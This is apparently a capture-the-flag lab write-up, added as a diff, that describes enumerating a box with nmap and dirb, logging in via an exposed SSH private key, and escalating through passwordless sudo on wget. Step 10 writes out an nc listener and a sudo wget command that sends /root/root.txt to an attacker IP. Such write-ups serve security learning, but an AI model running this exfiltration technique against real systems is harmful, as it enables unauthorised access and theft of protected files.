@@ -1,0 +1,11 @@
+1. First as usual i did an nmap scan on the ip and discoverd on port 80 and 22 is open. Then after adding the ip to the hosts file i discovered a default apache page.
+2. Then i found a comment which said "jessie update the code" or something similar.
+3. Then for increasing my threat landscape i did a dirb scan and found out an endpoint /sitemap. it was hosting an uniapp in that endpoint. Then after scrolling through that site didn't found anything useful.
+4. so, Again did a dirb on that "/sitemap" endpoint and discovered a private key in a directory called `.ssh`. Then used that private key to login to the ssh server with the username 'Jessie'
+5. then got the first flag after logging in successfully.
+6. Now i had to perform prev esc for the root flag.
+7. then my first thought was to see what permissions i got in the sudoers file using the `sudo -l` command
+8. I found i was able to use the wget command without any password as any user
+9. Then after researching for a bit on how to exploit wget i got some good results and then performed the exploit 
+10. First i started a listener on the attacker machine to listen and save the incoming results in a file `nc -lnvp 4444 > root.txt`, then used the command `sudo /usr/bin/wget /root/root.txt http://<attacker_ip>:4444` on the victim machine.
+11. Then the flag was stored in the root.txt file.
